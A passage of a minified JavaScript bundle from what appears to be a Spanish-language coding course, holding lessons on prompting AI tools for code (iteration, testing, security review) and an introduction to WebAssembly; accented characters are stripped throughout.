## 3. El uso de "System Prompts"
Si usas herramientas como Cursor o IDEs con IA, puedes configurar archivos como \`.cursorrules\` para que la IA siempre sepa tus preferencias (ej: "Siempre usa flecha para las funciones", "Siempre escribe en espaol").

---

### Misin Junior:
Redacta un prompt para crear un "Formulario de Registro" que incluya:
*   Campos: Nombre, Email, Password.
*   Tecnologa: HTML y CSS puro.
*   Validacin: Que el password tenga al menos 8 caracteres (usando solo atributos HTML).
*   Estilo: Dark mode elegante.
Pgalo en una IA y mira la diferencia entre el cdigo generado con este prompt detallado vs uno simple.
`,completed:!1},{id:"vibe-04-pedir-codigo",title:"Cmo pedir cdigo",level:"junior",content:`# Leccin 4: Cmo pedir cdigo correctamente

Pedir cdigo no es pedir magia. Es dar instrucciones de ingeniera.

## 1. Divide y Vencers (Chunking)
No pidas una aplicacin entera en un solo prompt. La IA tiene una "ventana de contexto" (memoria) limitada.
*   **MAL:** "Hazme un clon de Spotify". (La IA fallar, ser genrico y tendr bugs).
*   **BIEN:**
    *   Prompt 1: "Aydame a definir el esquema de datos para una cancin".
    *   Prompt 2: "Crea el componente de la barra de reproduccin (UI)".
    *   Prompt 3: "Implementa la lgica de Play/Pause usando la API de Audio".

## 2. Da Ejemplo (Few-Shot Prompts)
Si quieres que el cdigo tenga un estilo especfico, dale un ejemplo.
> "Aqu tienes un ejemplo de cmo escribo mis componentes: [Cdigo]. Ahora, escribe un nuevo componente llamado \`UserProfile\` siguiendo este mismo patrn de nombres y estructura."

## 3. Pide explicaciones, no solo resultados
Un truco avanzado es pedirle a la IA que piense antes de escribir:
> "Antes de darme el cdigo, analiza los posibles desafos de rendimiento de este componente y luego escribe la versin optimizada."

---

### Misin Junior:
Pdele a una IA que genere una funcin en JavaScript para "Filtrar un array de tareas por estado (completado o no)".
Condicin extra: "No me des el cdigo directamente. Primero descrbeme cul sera el mejor mtodo de array para usar (\`map\`, \`filter\`, \`reduce\`) y por qu. Despus de mi confirmacin, dame el cdigo".
Esta es la tcnica de la **Confirmacin de Lgica**.
`,completed:!1},{id:"vibe-05-iteracion",title:"Iteracin de Cdigo",level:"junior",content:`# Leccin 5: La Magia de la Iteracin

El primer resultado de la IA casi nunca es el final. El Vibecoder es un **escultor**.

## 1. Qu es iterar?
Iterar es el proceso de refinar el cdigo a travs de mltiples ciclos de retroalimentacin.

## 2. Tipos de Iteracin
*   **Iteracin por Estilo:** "El cdigo funciona, pero usa variables con nombres ms cortos y descriptivos".
*   **Iteracin por Funcionalidad:** "Ahora agrega un botn para que el usuario pueda borrar este elemento de la lista".
*   **Iteracin por Error:** "Me da un error en la lnea 12, parece que \`data\` es \`undefined\`. Corrige el cdigo para manejar este caso nulo".

## 3. Manteniendo el Hilo
Cuando iteras, no abras un chat nuevo cada vez. El historial es vital para que la IA entienda qu cambi y por qu.
*   *Tip:* Si te gusta cmo qued una parte pero otra no, di: "Mantn la lgica de la funcin \`X\` exactamente igual, pero cambia el diseo del componente \`Y\`".

---

### Misin Junior:
1. Crea un prompt para un botn simple en CSS que diga "Click me".
2. **Iteracin 1:** Pdele que el botn sea azul y se vuelva naranja al pasar el mouse (hover).
3. **Iteracin 2:** Pdele que tenga una sombra suave y bordes redondeados.
4. **Iteracin 3:** Pdele que el botn "pulse" (animacin) suavemente todo el tiempo.
Mira cmo el cdigo crece y se vuelve ms complejo gracias a tus instrucciones incrementales.
`,completed:!1},{id:"vibe-06-bugs",title:"Detectando Bugs de IA",level:"junior",content:`# Leccin 6: Detectando Errores (Code Review IA)

Confiar ciegamente en la IA es el camino rpido al desempleo. Debes aprender a ser su crtico ms feroz.

## 1. Patrones de "Alucinacin"
La IA suele cometer estos errores comunes:
*   **Libreras Fantasma:** Importa archivos que nunca creaste o libreras que no estn instaladas.
*   **Lgica Circular:** Crea bucles infinitos por accidente al intentar resolver una dependencia.
*   **Sintaxis Hbrida:** Mezcla versiones (ej: mezcla React antiguo de clases con Hooks modernos).

## 2. Cmo auditar el cdigo
*   **Lee el cdigo:** No solo lo pegues. Si hay una lnea que no entiendes, pregntale a la IA: "Qu hace exactamente este \`Array.prototype.reduce\`?".
*   **Consola de Errores:** Si pegas el cdigo y tu navegador muestra rojo, copia el error de la consola y devulvelo a la IA: "Me das este error: [Error]. Cmo lo resolvemos?".
*   **Linting:** Usa herramientas como ESLint. Si la IA escribe cdigo feo o con inconsistencias, el linter te avisar.

## 3. Pruebas de Estrs
Pregntate: "Qu pasa si le paso un array vaco a esta funcin que hizo la IA? Explotar?". Si crees que s, pdele que aada manejo de errores.

---

### Misin Junior:
Pdele a la IA que genere un "Calculador de promedio de notas".
Luego, intenta pasarle un texto en lugar de un nmero. Si la aplicacin se rompe o dice \`NaN\`, has detectado un bug.
Pdele a la IA: "El cdigo falla cuando el usuario ingresa texto en lugar de nmeros. Corrige la validacin para que muestre un mensaje de error amigable".
`,completed:!1},{id:"vibe-07-limitaciones",title:"Limitaciones Modelos",level:"junior",content:`# Leccin 7: Limitaciones Reales de los Modelos

Para ser un Vibecoder profesional, debes conocer las fronteras de lo que la IA puede y no puede hacer hoy.

## 1. La Ventana de Contexto (Memoria a corto plazo)
Cada modelo (Claude, GPT-4, Gemini) tiene un lmite de cunta informacin puede procesar a la vez.
*   Si le pasas 50 archivos de tu proyecto, llegar un punto en que empezar a olvidar los primeros archivos o a confundir variables entre ellos.
*   **Junior Tip:** S especfico. No le pases todo el proyecto si solo quieres arreglar un botn.

## 2. El Corte de Conocimiento (Knowledge Cutoff)
Las IAs fueron entrenadas hasta una fecha especfica.
*   Si una librera de JavaScript (ej. Next.js) cambi su forma de funcionar ayer, la IA probablemente te dar cdigo de la versin anterior.
*   **Cmo solucionarlo:** Psale la documentacin actual como texto: "Usa este fragmento de la documentacin oficial para escribir el cdigo".

## 3. Lgica Compleja vs. Patrones Comunes
*   La IA es increble reconociendo patrones (ej. un CRUD, un Formulario).
*   La IA es propensa a fallar en lgica matemtica muy abstracta o algoritmos extremadamente especficos que no estn en internet.

## 4. El efecto "Loro Estocstico"
A veces la IA simplemente est prediciendo la siguiente palabra ms probable. No "entiende" el negocio. Puede sugerir una solucin que tcnicamente compila pero que no tiene sentido para los usuarios de tu app.

---

### Misin Junior:
Pregntale a tu IA favorita: "Cul es tu fecha de corte de conocimiento?".
Luego, intenta pedirle que use una feature de una librera que haya salido despus de esa fecha. Vers cmo intenta inventar algo o usa la versin vieja. Aprende a detectar este "desfase".
`,completed:!1},{id:"vibe-08-riesgos",title:"Riesgos de Dependencia",level:"junior",content:`# Leccin 8: Los Riesgos de la Dependencia (Sin Criterio)

El Vibecoding es una superpotencia, pero mal usado puede arruinar tu carrera.

## 1. La Parlisis del Pensamiento
Si dejas de pensar en la lgica y solo esperas a que la IA te d la respuesta, tu cerebro dejar de entrenar las conexiones necesarias para resolver problemas complejos.
*   **Consecuencia:** En una entrevista tcnica presencial (donde no haya IA), te quedars en blanco.

## 2. Cdigo "Frankenstein"
Ocurre cuando pegas trozos de cdigo de diferentes chats.
*   Chat 1 usa Variables Globales.
*   Chat 2 usa Hooks.
*   Chat 3 usa Estilos en lnea.
Tu proyecto se vuelve inmantenible y catico. Un programador Junior copia; un Vibecoder **unifica**.

## 3. Seguridad y Privacidad
NUNCA pegues API Keys, secretos de base de datos o informacin privada en un chat de IA. Esos datos podran terminar en el entrenamiento del modelo y ser vistos por otros.

## 4. El conformismo tcnico
Si la IA te da una solucin que "funciona", pero es ineficiente, y t la aceptas solo por terminar rpido, ests creando Deuda Tcnica.

---

### Misin Junior:
Escribe un pequeo cdigo a mano (sin IA) para invertir una cadena de texto (ej: "Hola" -> "aloH").
Luego, pide a la IA que lo haga de 3 formas diferentes.
Compara tu solucin con las de ella. Cul es ms legible? Cul es ms corta? Este ejercicio de **comparacin constante** es lo que te mantiene agudo.
`,completed:!1},{id:"vibe-09-final-junior",title:"Proyecto Junior Vibecoding",level:"junior",content:`# Proyecto Final Nivel Junior: "El Generador de Perfiles"

Es hora de demostrar que manejas la IA, y no al revs.

## Objetivo
Construir una aplicacin simple de "Tarjetas de Usuario" usando React y Tailwind CSS, pero la regla es: **Toda la estructura inicial debe ser generada por IA, pero t debes refinarla manualmente.**

## Tareas Tcnico-Prcticas

### 1. Generacin de Estructura (Prompt 1)
Pide a la IA que genere un componente \`UserCard\` que reciba un objeto de usuario con \`nombre\`, \`avatar\`, \`rol\` y \`bio\`. Usa Tailwind.

### 2. Iteracin de Estilo (Prompt 2)
Pide que el diseo sea ms moderno, use una sombra suave y bordes redondeados.

### 3. Iteracin de Funcionalidad (Manual)
Agrega un botn manual (escrbelo t) que al hacer click abra un alert con el nombre del usuario.

### 4. Deteccin de Bugs (Desafo)
Pdele a la IA que la lista de usuarios venga de una API (puedes usar \`jsonplaceholder\`).
Si la IA olvida el \`useEffect\` o los estados de carga (Loading/Error), **debes detectarlo y pedirle que lo agregue**.

## Evaluacin Crtica
Escribe un pequeo archivo \`REFLEXION.md\` respondiendo:
1. Qu parte del cdigo te dio la IA que t no hubieras sabido escribir?
2. Hubo alguna lnea que la IA escribi y que t decidiste borrar o cambiar? Por qu?
3. Si maana no existiera la IA, podras replicar esta aplicacin t solo?

## Entregable (Checklist)
*   [ ] Cdigo limpio y funcionando.
*   [ ] Sin errores en la consola del navegador.
*   [ ] Documento de reflexin completado.

Felicidades, Junior Vibecoder! Has pasado de copiar a dirigir.
`,completed:!1},{id:"vibe-10-arquitectura",title:"Arquitectura Asistida",level:"semi-senior",content:`# Leccin 10: Arquitectura Asistida por IA (Semi-Senior)

En este nivel, dejamos de pedir "componentes" y empezamos a pedir "sistemas".

## 1. Diseando con Diagramas
Antes de escribir una sola lnea de cdigo, usa la IA para validar tu arquitectura.
*   **Prompt:** "Acta como un Arquitecto de Software. Quiero construir un e-commerce de suscripcin. Cul es el mejor flujo para manejar pagos recurrentes y accesos denegados si el pago falla? Dame un diagrama en formato Mermaid".
*   La IA te ayudar a ver "puntos de fallo" que un desarrollador Junior ignora.

## 2. Definicin de la "Verdad" (Schemas)
Utiliza la IA para definir tus modelos de datos al inicio.
*   "Genera el esquema de base de datos para un sistema de gestin de hospitales, incluyendo pacientes, mdicos y citas. Asegrate de que las relaciones sean ptimas para consultas frecuentes".

## 3. Descubrimiento de Patrones
Pregunta a la IA qu patrn de diseo encaja mejor con tu problema:
*   "Debera usar un patrn \`Observer\` o \`Pub/Sub\` para notificaciones en tiempo real en una app de chat con 10,000 usuarios?".
*   Analiza los pros y contras que te da la IA con tu propia experiencia tcnica.

## 4. IA como Revisor de Arquitectura
Pgale una descripcin de tu estructura de carpetas y pdele:
*   "Analiza si mi estructura de carpetas sigue los principios de \`Clean Architecture\`. Hay algn acoplamiento innecesario entre mi capa de datos y mi UI?".

---

### Misin Semi-Senior:
Describe un sistema que quieras construir (ej. un clon de Uber Eats). Pdele a la IA que disee la arquitectura de microservicios. Cuando te d la respuesta, **cuestinala**: "Esa base de datos SQL para el tracking de geolocalizacin en tiempo real parece ineficiente, no sera mejor una NoSQL o Redis?". Mira cmo la IA cambia su razonamiento ante tu crtica tcnica.
`,completed:!1},{id:"vibe-11-contexto",title:"Gestin de Contexto",level:"semi-senior",content:`# Leccin 11: Cmo dar contexto completo (Context Window Management)

El mayor desafo del Semi-Senior es manejar proyectos grandes donde la IA ya no puede "leerlo todo".

## 1. El Problema de la Amnesia
Cuando tu proyecto supera los 50 archivos, la IA empezar a olvidar las variables de otros archivos. Esto genera bugs de "referencia no definida".

## 2. Herramientas de Contexto (Context Injection)
En herramientas profesionales como Cursor, puedes usar smbolos:
*   \`@Files\`: Para aadir archivos especficos al prompt.
*   \`@Folder\`: Para que la IA entienda toda la lgica de un mdulo.
*   \`@Web\`: Para documentaciones actualizadas.

## 3. Estrategia de "Inyectar" Conocimiento
Si usas ChatGPT/Claude web, crea un "resumen de contexto":
> "Estamos construyendo una app con: Next.js 14 (App Router), Tailwind y Firebase. No uses Redux, usamos Context API. Aqu te dejo el archivo de configuracin actual de auth: [Cdigo]. Ahora, basado en esto, crea la pgina de perfil."

## 4. Manteniendo la Coherencia
Si cambias un nombre de funcin en un archivo, **debes informar a la IA** antes de pedirle que trabaje en el archivo siguiente que depende de esa funcin.
*   *Tip:* Usa la IA para generar el archivo de "Contexto del Proyecto" (como un \`README.md\` tcnico) que siempre le pases al inicio de cada sesin.

---

### Misin Semi-Senior:
Prepara un prompt que incluya el contexto de **3 archivos diferentes** de tu proyecto (ej. un componente, su estilo CSS y su test). Pdele que haga un cambio global que afecte a los tres y observa si mantiene la coherencia entre ellos.
`,completed:!1},{id:"vibe-12-patrones",title:"Pattern Enforcement",level:"semi-senior",content:`# Leccin 12: Previniendo el Caos (Pattern Enforcement)

La IA es perezosa por naturaleza. Si puede tomar un atajo feo, lo har. Tu trabajo es obligarla a seguir tus patrones.

## 1. El Peligro del "Atajo"
A veces la IA te da una solucin que funciona hoy, pero ensucia el cdigo maana (ej. usar \`any\` en TypeScript o estilos en lnea en lugar de clases CSS reutilizables).

## 2. Instrucciones Negativas (Negative Prompts)
A veces es ms importante decir lo que **NUNCA** debe hacer:
*   "Nunca uses libreras externas para conos, usa SVGs puros".
*   "No utilices componentes de clase, solo componentes funcionales".
*   "No apliques lgica de negocio dentro del componente visual, extrela a un custom hook".

## 3. Gua de Estilo (.ai-rules)
Crea un archivo de configuracin para tu IA (como \`.cursorrules\`) donde definas:
*   "Siempre usa \`const\` para funciones".
*   "Usa espaol para los comentarios pero ingls para el cdigo".
*   "Cada componente debe tener su archivo de tests \`.test.js\` en la misma carpeta".

## 4. Auditora de Patrones
Antes de aceptar un archivo generado, pregntale:
*   "Este cdigo cumple con SRP (Single Responsibility Principle)? Refactoriza si es necesario".

---

### Misin Semi-Senior:
Pdele a la IA que cree una tabla de usuarios. Pero dale este prompt restrictivo:
"Crea una tabla en React. REGLAS: 1) No uses \`<table>\` (usa divs con Flexbox). 2) Los colores deben venir de una variable de CSS, no de Tailwind. 3) Si el cdigo tiene ms de 50 lneas, divdelo en dos archivos."
Vers cmo la IA se esfuerza ms por seguir tu estructura que por darte la solucin fcil.
`,completed:!1},{id:"vibe-13-modularizacion",title:"Modularizacin Pro",level:"semi-senior",content:`# Leccin 13: Modularizacin Pro (Proyectos Grandes)

En un proyecto profesional, el cdigo vive en mdulos. La IA tiende a querer ponerlo todo en un solo archivo Gigante. Evtalo.

## 1. El Enfoque Atmico
Pide a la IA que genere componentes por separado.
*   "Genera solo el tomo \`Button\`. Luego genera la molcula \`ButtonGroup\`. Finalmente el organismo \`Header\`".

## 2. Inyeccin de Interfaces (TypeScript)
Como Semi-Senior, debes usar TypeScript. La IA es excelente para inferir tipos, pero t debes definirlos primero.
*   **Prompt:** "Aqu est mi interfaz de TypeScript para un Producto. Basado en esto, genera un componente que lo muestre de forma segura (Type-safe)".

## 3. Manejo de Side-Effects (Lgica separada)
Aprende a pedir que la lgica pesada viva fuera de la UI.
*   "Crea un Custom Hook llamado \`useInventory\` que maneje el estado de los productos, la carga de datos desde la API y el filtrado. No incluyas nada de HTML en este archivo".

## 4. Unificando mdulos
Cuando tengas varios archivos generados, pdele a la IA que acte como un **Linter Humano**:
*   "Revisa estos 4 archivos y asegrate de que los nombres de las funciones y variables sean coherentes entre s".

---

### Misin Semi-Senior:
Toma un componente que ya tengas y pdele a la IA: "Extrae toda la lgica de los \`useState\` y \`useEffect\` a un Custom Hook separado. Deja el componente visual limpio, recibiendo solo los datos finales y las funciones por props". Este es el estndar de la industria.
`,completed:!1},{id:"vibe-14-tests",title:"Testing con IA",level:"semi-senior",content:`# Leccin 14: Testing Generado por IA (Sin trampas)

Escribir tests es tedioso. La IA es perfecta para esto, pero debes supervisar que el test sea til y no solo "verde".

## 1. Unit Testing (Jest / Vitest)
La IA puede generar el 90% del cdigo de un test unitario si el componente es pequeo.
*   **Prompt:** "Genera tests para esta funcin de suma. Asegrate de cubrir casos bordes como nmeros negativos, ceros y strings en lugar de nmeros".

## 2. El peligro del "Test en Espejo"
A veces, si la IA escribi el componente, escribir el test para que pase *su propia lgica*, aunque est mal.
*   **Cmo evitarlo:** Primero pide que escriba el test basado en una descripcin (TDD) y luego que escriba el cdigo que haga pasar ese test.

## 3. Integration Testing (Mocks)
Pide que simule llamadas a APIs:
*   "Genera un test de integracin para mi pgina de Login. Usa \`msw\` para mofas la respuesta de la API de autenticacin tanto para xito como para error 401".

## 4. Auditora de Cobertura
Pdele: "Qu escenarios me faltan testear en este componente? No me los des todos, dame solo los 3 ms crticos para la seguridad".

---

### Misin Semi-Senior:
Toma una funcin que calcule descuentos.
1. Pdele a la IA que genere los tests unitarios.
2. Agrega un bug a propsito en la funcin.
3. Corre el test. Si el test no falla, la IA hizo un mal test. Pdele que lo corrija para que detecte ese error especfico.
`,completed:!1},{id:"vibe-15-seguridad",title:"Seguridad en IA",level:"semi-senior",content:`# Leccin 15: Auditora de Seguridad (Criterio Humano)

La IA no es un experto en seguridad. Puede sugerir cdigo vulnerable si no se le gua.

## 1. Vulnerabilidades Comunes en IA
*   **XSS (Cross-Site Scripting):** La IA puede sugerir usar \`dangerouslySetInnerHTML\` en React sin advertirte del riesgo.
*   **SQL Injection:** Puede generar queries concatenando strings en lugar de usar parmetros.
*   **CORS Abierto:** Puede sugerir configurar \`Access-Control-Allow-Origin: *\` por comodidad.

## 2. Pidindole a la IA que sea un "Pentester"
Usa el rol de experto en seguridad:
*   "Acta como un experto en ciberseguridad. Revisa este fragmento de backend y dime si hay alguna superficie de ataque obvia o riesgo de inyeccin".

## 3. Secretos y Variables de Entorno
Si la IA pone una contrasea en una variable \`const password = "123"\`, reprndela. Oblgala a usar \`process.env\`.
*   "Refactoriza esto para que todas las credenciales se lean de variables de entorno".

## 4. Validacin de Inputs
Asegrate de que no confe en los datos del usuario:
*   "Agrega validacin de esquemas (con Zod o Joi) a este objeto que recibo por el body del request".

---

### Misin Semi-Senior:
Crea un formulario de comentarios donde el usuario pueda escribir. Pdele a la IA el cdigo para mostrar esos comentarios. Si la IA deja que el usuario escriba etiquetas \`<script>\`, es una brecha de seguridad. Corrige el cdigo aadiendo sanitizacin.
`,completed:!1},{id:"vibe-16-multi-modelo",title:"Workflow Multi-modelo",level:"semi-senior",content:`# Leccin 16: Uso Profesional de Modelos (Multi-model workflow)

Un desarrollador Semi-Senior no se casa con un solo modelo. Usa cada uno para lo que es mejor.

## 1. El Tro de Hierro
*   **Claude 3.5 Sonnet:** Actualmente el mejor para lgica de programacin, React y refactorizacin compleja. Tiene mejores "vibras" de cdigo limpio.
*   **GPT-4o:** Excelente para resolver errores de configuracin, DevOps y buscar docs antiguos.
*   **DeepSeek / Gemini:** Muy buenos para manejar contextos gigantes o explicar conceptos tericos paso a paso.

## 2. El Flujo de Trabajo Cruzado
1.  **Diseo:** Pide a uno (Claude) que haga la arquitectura.
2.  **Segunda Opinin:** Pgaselo a otro (GPT-4) y dile: "Claude hizo esto, dime qu errores de rendimiento o seguridad ves" (**Brainstorming asistido**).
3.  **Refinado:** Vuelve al primero con las crticas del segundo: "Se detect que X podra ser lento, corrgelo usando esta tcnica".

## 3. Comparacin de Resultados
Si tienes un error que un modelo no sabe resolver tras 3 intentos, **camina hacia otro chat con otro modelo**. A veces el "hilo" del chat se ensucia y un modelo nuevo con el contexto fresco resuelve el error en un segundo.

---

### Misin Semi-Senior:
Toma un fragmento de cdigo complejo que te haya dado una IA. Pgalo en otra diferente y dile: "Explcame cmo puedo optimizar este cdigo para que use menos memoria". Compara las dos sugerencias. Cul te convence ms tcnicamente?
`,completed:!1},{id:"vibe-17-prompt-adv",title:"Prompt Engineering Pro",level:"semi-senior",content:`# Leccin 17: Prompt Engineering Avanzado (Semi-Senior)

Deja de hacer preguntas y empieza a programar a la IA.

## 1. Chain of Thought (Cadena de pensamiento)
Obliga a la IA a razonar antes de tirar cdigo.
*   **Prompt:** "Analiza paso a paso los requisitos, define las dependencias necesarias y, por ltimo, escribe el cdigo completo".

## 2. Inyeccin de Roles Dinmicos
No uses solo "Senior Dev". S ms especfico:
*   "Acta como un Database Administrator experto en PostgreSQL y optimizacin de ndices".
*   "Acta como un experto en accesibilidad (A11y) con certificacin WCAG 2.1".

## 3. Delimitadores de Contexto
Usa marcas claras para que la IA sepa qu es cdigo y qu es instruccin:
> "Tarea: Actualiza el componente basado en la documentacin que sigue a continuacin.
> DOCUMENTACIN:
> \`\`\`
> [Contenido]
> \`\`\`
> CDIGO ACTUAL:
> \`\`\`javascript
> [Cdigo]
> \`\`\`"

## 4. One-Shot / Few-Shot (Ejemplos)
Si quieres que escriba con tu "vibe", entrnala con una sola muestra:
*   "Aqu tienes un ejemplo de cmo escribo mis controladores en Node.js: [Ejemplo]. Ahora, genera un nuevo controlador para la entidad 'Ordenes' siguiendo esta misma estructura de carpetas, manejo de errores y nomenclatura".

---

### Misin Semi-Senior:
Crea un "System Prompt" personal para tu IDE. Debe incluir: 1) Tu lenguaje preferido, 2) Tu estilo de funciones, 3) Tu librera de estilos y 4) Una regla sobre cmo quieres que se manejen los errores. salo durante una semana y nota cunto tiempo ahorras al no tener que repetir tus gustos de cdigo.
`,completed:!1},{id:"vibe-18-final-semisenior",title:"Proyecto Semi-Senior Vibecoding",level:"semi-senior",content:`# Proyecto Final Semi-Senior: "Arquitectura Hbrida Supervisada"

Es hora de construir un sistema "Full Stack" delegando la sintaxis pero controlando cada decisin arquitectnica.

## El Escenario
Debes construir un sistema de "Gestin de Tareas con Roles".
*   Admin: Puede ver, crear, editar y borrar cualquier tarea.
*   Editor: Puede ver y editar todas las tareas, pero no borrarlas.
*   User: Solo puede ver sus propias tareas.

## Requerimientos Tcnicos (IA Asistida)

### 1. El Diseo de Datos
Pide a la IA que genere el esquema de base de datos (SQL o NoSQL) y los roles de usuario. **Debes validar que los roles no sean redundantes.**

### 2. El Backend (Contexto Inyectado)
Pide a la IA que genere los controladores de la API. Debes inyectar el contexto de qu librera de Auth ests usando (ej. JWT). **Debes aadir manualmente un middleware de seguridad que la IA olvide.**

### 3. El Frontend (Modularizacin)
Genera los componentes de la UI por separado (Botones, Inputs, Listas). Luego unifcalos en una pgina principal. **Refactoriza el cdigo de la pgina principal para usar un Custom Hook de Fetching.**

### 4. Testing (Calidad)
Genera el test de integracin para el flujo de "Un usuario intenta borrar una tarea que no es suya y recibe un error 403".

## Defensa de la Arquitectura
Escribe un archivo \`DESIGN_DECISIONS.md\`:
1. Por qu elegiste ese patrn de arquitectura para los roles?
2. Qu vulnerabilidad de seguridad detectaste y corregiste en el cdigo generado por la IA?
3. Cmo lograste que la IA no repitiera cdigo en el Frontend?

---

Felicidades, Semi-Senior! Has demostrado que puedes escalar un proyecto usando la IA como una palanca tcnica en lugar de una muleta.
`,completed:!1}]},gv={id:"wasm",title:"WebAssembly (WASM)",description:"Descubre cmo llevar el rendimiento de tus aplicaciones web al lmite ejecutando cdigo de bajo nivel a velocidad nativa.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"wasm-01-intro-wasm",title:"Qu es WebAssembly (WASM)?",level:"junior",content:`# Leccin 01: Qu es WebAssembly (WASM)?

**WebAssembly** (WASM) es un formato de instrucciones binarias diseado para ser ejecutado en el navegador a una velocidad cercana a la nativa. No viene a reemplazar a JavaScript, sino a trabajar junto a l.

## 1. Por qu lo necesitamos?
JavaScript es genial, pero tiene lmites. Cuando intentas hacer tareas muy pesadas (edicin de video en vivo, juegos 3D complejos, simulaciones fsicas), JS puede volverse lento porque es un lenguaje interpretado y dinmico.

**WASM** permite que lenguajes de bajo nivel como C++, Rust o Go corran en la web con un rendimiento increble.

## 2. Caractersticas Clave
*   **Velocidad:** Se compila a un formato binario que el navegador entiende casi instantneamente.
*   **Seguridad:** Corre en el mismo "sandbox" seguro que JavaScript. No puede acceder a tus archivos personales sin permiso.
*   **Portabilidad:** El mismo archivo \`.wasm\` funciona en Chrome, Firefox, Safari y Edge.

## 3. El Flujo de Trabajo
1.  Escribes cdigo en un lenguaje como **Rust**.
2.  Lo compilas a un archivo \`.wasm\`.
3.  Lo cargas en tu sitio web usando **JavaScript**.

---

### Concepto Junior:
Imagina que JavaScript es un excelente conductor de ciudad, pero WebAssembly es un motor de Frmula 1. Usas JS para la lgica de la App y WASM para las partes que requieren fuerza bruta.
`,completed:!1},{id:"wasm-02-integracion-js",title:"Integracin Bsica con JavaScript",level:"junior",content:`# Leccin 02: Integracin Bsica con JavaScript

Para usar WebAssembly, no necesitas dejar de usar JavaScript. De hecho, JS es el que "enciende" y controla el mdulo WASM.

## 1. Cargar un mdulo
El navegador tiene una API llamada \`WebAssembly\`. La forma ms moderna de cargar un mdulo es:

\`\`\`javascript
const response = await fetch('modulo.wasm');
const bytes = await response.arrayBuffer();
const { instance } = await WebAssembly.instantiate(bytes);

// Ahora puedes usar las funciones exportadas del mdulo
console.log(instance.exports.sumar(5, 10));
\`\`\`

## 2. Paso de datos
WASM solo entiende nmeros (enteros y flotantes). 
*   Si quieres pasar un **String** o un **Objeto**, la cosa se pone difcil: debes escribir esos datos en la "Memoria Compartida" (Shared Memory) del mdulo.
*   Por suerte, existen herramientas que automatizan esto por ti.

## 3. Cundo usarlo (Casos simples)
*   Algoritmos de compresin de imgenes.
*   Clculos matemticos complejos que se repiten miles de veces.
*   Parsing de archivos muy grandes.

---

### Misin Junior:
Aprender que WASM es como un "invitado especial" en tu programa. JS prepara la fiesta (el DOM, la UI), y WASM hace el trabajo pesado en la cocina.

### Ejercicio 2:
Si WebAssembly solo entiende nmeros, cmo crees que enviamos un nombre de usuario ("Octavio") al mdulo? (Pista: Los caracteres se convierten a nmeros usando cdigos como ASCII o UTF-8).
`,completed:!1},{id:"wasm-03-casos-reales-tooling",title:"Casos Reales y Performance",level:"semi-senior",content:`# Leccin 03: Casos Reales y Performance

Como Semi-Senior, ya no te maravilla que WASM sume nmeros rpido. Ahora te interesa saber dnde se aplica en la industria y cmo medir su impacto.

## 1. Casos Reales que cambiaron la Web
*   **Figma:** Casi todo el motor de diseo de Figma est escrito en C++ y compilado a WASM. Por eso es tan fluido comparado con otras herramientas web.
*   **Google Earth:** Antes era un programa pesado que debas instalar. Ahora corre en el navegador gracias a que portaron su cdigo base a WASM.
*   **Photoshop Web:** Adobe logr llevar las herramientas profesionales de edicin a la web usando esta tecnologa.

## 2. El costo del puente (JS-WASM Bridge)
Llamar a una funcin de WASM desde JS tiene un costo pequeo.
*   Si llamas a WASM para algo trivial 1 milln de veces, podras terminar siendo ms lento que JS puro debido al costo de cruzar el "puente".
*   **Estrategia:** Pasa el trabajo pesado a WASM, deja que procese todo all adentro durante mucho tiempo, y devuelve el resultado final.

## 3. Tooling Profesional
Dependiendo del lenguaje que elijas, usars diferentes herramientas:
*   **Rust:** \`wasm-pack\` y \`wasm-bindgen\`. Es el lenguaje ms amigable para WASM hoy en da.
*   **C++:** \`Emscripten\`. Es el veterano, ideal para portar libreras viejas de escritorio.
*   **AssemblyScript:** Un lenguaje muy parecido a TypeScript que compila directamente a WASM.

---

### Lo que hace un Semi-Senior:
Analiza si un clculo realmente necesita WASM. No usa WASM "porque es nuevo", sino cuando el Profiler de Chrome le dice que JavaScript est sufriendo.
`,completed:!1},{id:"wasm-04-arquitectura-seguridad",title:"Arquitectura y Sistemas Hbridos",level:"senior",content:`# Leccin 04: Arquitectura y Sistemas Hbridos

En el nivel Senior, WebAssembly no es solo una funcin rpida; es una decisin de arquitectura que permite portar lgica de negocio entre el Servidor y el Cliente.

## 1. Wasmtime y WASI (WebAssembly System Interface)
WASM ya no es solo para el navegador. Con **WASI**, WASM puede correr en servidores, dispositivos IoT y nubes.
*   **Servicios Cloud (Edge Computing):** Plataformas como Cloudflare Workers usan WASM para ejecutar cdigo ultra rpido cerca del usuario.

## 2. Arquitectura de Memoria Compartida
Un Senior domina el \`Linear Memory\`. El mdulo WASM ve la memoria como un gran array de bytes.
*   **Punteros en JS:** Aprendes a manejar punteros de memoria para leer estructuras de datos complejas sin copiar los datos (Zero-copy), lo cual es vital para la performance extrema.

## 3. Seguridad Avanzada: El Aislamiento
A diferencia de los plugins de antes (Flash o Java Applets), WASM no tiene acceso al sistema operativo.
*   **Capabiliy-based security:** Un mdulo WASM solo puede hacer lo que el host (JavaScript o el Servidor) le permite explcitamente a travs de funciones importadas. Esto lo hace ideal para ejecutar cdigo de terceros de forma segura.

---

### Visin Senior:
"WASM permite que el mismo motor de fsica o de encriptacin corra en tu App de iPhone, en tu web de React y en tu microservicio de Node.js, garantizando que el comportamiento sea 100% idntico en todos lados".

### Desafo Senior:
Investiga el concepto de **Component Model**. Es el futuro de WASM que permitir que un mdulo escrito en Rust use una librera escrita en Go sin complicaciones, todo dentro del navegador.
`,completed:!1},{id:"wasm-05-practica-wasm",title:"Prctica y Evaluacin: Maestro de WebAssembly",level:"senior",content:`# Prctica y Evaluacin: Maestro de WebAssembly

Demuestra tu capacidad para integrar potencia de bajo nivel en aplicaciones modernas.

---

## 1. Ejercicio Junior: El Creador de Mdulos
**Escenario:** Tienes una funcin en C que calcula el factorial de un nmero. Ya la compilaste a \`math.wasm\`.
*Consigna:* Escribe el cdigo necesario en JavaScript para cargar el mdulo y ejecutar la funcin \`factorial(5)\`.

## 2. Ejercicio Semi-Senior: Analista de Performance
**Escenario:** Tienes que procesar los pxeles de una cmara en tiempo real para aplicar un filtro de blanco y negro. 
1. Por qu enviaras la imagen a WASM en lugar de procesarla en JavaScript?
2. Cmo evitaras el cuello de botella al pasar los datos? (Pista: Memoria compartida).

## 3. Evaluacin Senior: Diseo de Sistema
**Escenario:** Tu empresa tiene una librera de encriptacin bancaria escrita en C++ hace 10 aos. Necesitan que los usuarios puedan firmar documentos desde el navegador sin que la clave privada salga de la computadora del cliente.
1. Describe cmo usaras WASM para este caso.
